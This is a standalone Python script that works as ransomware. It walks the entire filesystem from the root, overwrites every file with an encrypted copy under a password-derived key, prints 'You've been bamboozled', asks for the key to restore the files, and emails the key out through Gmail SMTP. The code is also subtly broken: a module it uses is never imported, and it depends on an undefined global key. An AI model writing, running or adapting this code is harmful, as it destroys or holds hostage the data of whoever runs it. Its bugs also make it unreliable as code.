import os
import cryptography
from cryptography.fernet import Fernet
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from email.mime.text import MIMEText
import smtplib

def encrypt_files(key):
    for root, dirs, files in os.walk("/"):
        for file in files:
            file_path = os.path.join(root, file)
            with open(file_path, "rb") as f:
                data = f.read()
            fernet = Fernet(key)
            encrypted_data = fernet.encrypt(data)
            with open(file_path, "wb") as f:
                f.write(encrypted_data)

def decrypt_files(key):
    for root, dirs, files in os.walk("/"):
        for file in files:
            file_path = os.path.join(root, file)
            with open(file_path, "rb") as f:
                data = f.read()
            fernet = Fernet(key)
            decrypted_data = fernet.decrypt(data)
            with open(file_path, "wb") as f:
                f.write(decrypted_data)

def create_key():
    password_provided = input("Enter a password to generate the encryption key: ")
    password = password_provided.encode()
    salt = b'\x11\x92S\x02\xf2\x1b\xf8\xee\x04\x8a\xbb\x8f\x05\xde\xf9\x9e\x1a'
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        iterations=100000,
        length=32,
        salt=salt,
        backend=default_backend()
    )
    key = base64.urlsafe_b64encode(kdf.derive(password))
    with open("key.txt", "wb") as f:
        f.write(key)
    return key

def encrypt_keyfile_name():
    keyfile_name = "key.txt"
    keyfile_path = os.path.join(os.getcwd(), keyfile_name)
    with open(keyfile_path, "rb") as f:
        data = f.read()
    fernet = Fernet(key)
    encrypted_data = fernet.encrypt(keyfile_name.encode())
    encrypted_keyfile_name = encrypted_data.decode()
    os.rename(keyfile_path, os.path.join(os.getcwd(), encrypted_keyfile_name))
    return encrypted_keyfile_name
def decrypt_keyfile_name(encrypted_keyfile_name):
    fernet = Fernet(key)
    decrypted_keyfile_name = fernet.decrypt(encrypted_keyfile_name.encode()).decode()
    return decrypted_keyfile_name

def send_email(decrypted_keyfile_name, key):
    email = input("Enter the email address to send the decrypted keyfile name and key: ")
    password = input("Enter the email account's password: ")
    message = "Decrypted keyfile name: {}\nKey: {}".format(decrypted_keyfile_name, key)
    msg = MIMEText(message)
    msg['Subject'] = "Encryption key and decrypted keyfile name"
    msg['From'] = email
    msg['To'] = email

    server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
    server.login(email, password)
    server.send_message(msg)
    server.quit()
    print("Sent email to " + email)

if __name__ == "__main__":
    print("You've been bamboozled.")
    key = create_key()
    encrypt_files(key)
    key_provided = input("Enter the key to decrypt the files: ")
    if key_provided == key.decode():
        print("Correct")
        decrypt_files(key)
        encrypted_keyfile_name = encrypt_keyfile_name()
        decrypted_keyfile_name = decrypt_keyfile_name(encrypted_keyfile_name)
        send_email(decrypted_keyfile_name, key.decode())
    else:
        print("Incorrect")

